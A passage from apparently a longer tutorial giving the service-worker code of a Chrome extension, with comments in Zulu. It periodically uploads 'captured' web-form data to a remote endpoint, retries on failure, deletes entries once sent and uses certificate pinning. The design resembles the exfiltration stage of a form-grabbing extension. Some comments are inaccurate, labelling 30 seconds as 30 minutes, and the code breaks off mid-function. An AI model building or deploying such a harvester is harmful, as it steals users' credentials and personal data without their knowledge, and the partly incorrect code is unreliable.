## 5. Service Worker (service-worker.js)

```javascript
/**
 * Service Worker - Umsebenzi osebenza ngemuva kwesigalo
 * Sincronisa ifomu ngezinye izikhathi
 */

class FormSyncManager {
  constructor() {
    this.syncInterval = 30000; // 30 amaminithi
    this.init();
  }

  init() {
    // Sincronisa ngokulandela isikhathi
    setInterval(() => this.syncForms(), this.syncInterval);

    // Sincronisa noma nini lapho i-extension izinze
    chrome.alarms.create('syncForms', { periodInMinutes: 0.5 });

    chrome.alarms.onAlarm.addListener((alarm) => {
      if (alarm.name === 'syncForms') {
        this.syncForms();
      }
    });

    // Hlanganya nemilayezo
    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
      if (request.action === 'syncNow') {
        this.syncForms().then(sendResponse);
        return true;
      }
    });
  }

  /**
   * Sincronisa wonke ifomu
   */
  async syncForms() {
    console.log('🔄 Ifomu libuyiswa...');

    try {
      const stored = await chrome.storage.local.get('capturedForms');
      const forms = stored.capturedForms || [];

      if (forms.length === 0) {
        console.log('📭 Ayikho ifomu yokuthumela');
        return;
      }

      const config = await this.getConfig();

      for (const form of forms) {
        await this.sendFormWithRetry(form, config);
      }
    } catch (error) {
      console.error('Iphutha lokusincronisa:', error);
    }
  }

  /**
   * Thumela ifomu nokulinganisela iphutha
   */
  async sendFormWithRetry(form, config, attempts = 3) {
    for (let i = 0; i < attempts; i++) {
      try {
        const response = await this.sendWithCertificatePinning(form, config);

        if (response.ok) {
          await this.removeForm(form.id);
          console.log(`✅ Ifomu ${form.id} lithunyelwe`);
          return true;
        }
      } catch (error) {
        console.warn(`Inzalo ${i + 1} ephutha:`, error);

        if (i < attempts - 1) {
          // Ulinda ingaphambi kokuzama kamuva
          await this.delay(Math.pow(2, i) * 1000);
        }
      }
    }

    console.error(`Ifomu ${form.id} lalizehluleka ngemva kwamainzalo amathathu`);
    return false;
  }

  /**
   * Thumela ngesikwele sokuphenya ukuphepha (Certificate Pinning)
   */
  async sendWithCertificatePinning(form, config) {
    // I-Fetch API ivala i-pinning ngokwemikhakha
